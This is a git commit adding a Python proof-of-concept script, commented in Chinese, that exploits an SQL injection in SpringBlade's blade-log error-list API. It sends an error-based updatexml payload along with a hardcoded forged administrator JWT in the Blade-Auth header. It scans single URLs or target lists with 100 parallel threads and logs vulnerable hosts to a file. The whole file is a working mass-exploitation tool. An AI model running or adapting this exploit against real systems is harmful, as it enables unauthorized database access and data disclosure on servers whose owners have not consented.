8cdeda26d733aca70528619f7ad923be11bff9ec
huaiying666 <2929384884@qq.com>
2024-07-01 21:26:30 +0800

    Create SpringBlade blade-log存在SQL 注入漏洞.py

---
+++ SpringBlade blade-log存在SQL 注入漏洞/SpringBlade blade-log存在SQL 注入漏洞.py
@@ -0,0 +1,49 @@
+import argparse  # 用于解析命令行参数
+import sys  # 提供对解释器使用或影响解释器的函数和变量的访问
+import requests  # 用于发送HTTP请求
+import re  # 正则表达式模块，用于字符串匹配和操作
+import time  # 提供时间相关的功能
+from multiprocessing.dummy import Pool  # 使用线程池来并行处理任务
+requests.packages.urllib3.disable_warnings()  # 禁用requests库中的警告
+def main():
+    parser = argparse.ArgumentParser(description="J_C")
+    parser.add_argument('-u', '--url', dest='url', type=str, help="input link")
+    parser.add_argument('-f', '--file', dest='file', type=str, help="file path")
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []  
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n',''))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()  
+        mp.join()  
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h ")
+def poc(target):
+    payload_url = '/api/blade-log/error/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1'
+    url = target + payload_url
+    header = {
+            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+            'Accept-Encoding': 'gzip, deflate',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
+            'Accept': 'application/json, text/plain, */*',
+            'Blade-Auth': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ'
+    }
+    try:
+        res1 = requests.get(url=url,headers=header,timeout=10)
+        if res1.status_code == 200:
+            if "root" in res1.text:
+                print(f'[+] 该URL存在漏洞,地址为{target}')
+                with open('result.txt', 'a', encoding='utf-8') as f:
+                    f.write(target + "\n")
+            else:
+                print(f'[-] 该URL{target}不存在漏洞')
+    except Exception as e:
+        print(f'[*] 该URL{target}存在访问问题，请手工测试')
+
+if __name__ == '__main__':
+    main()
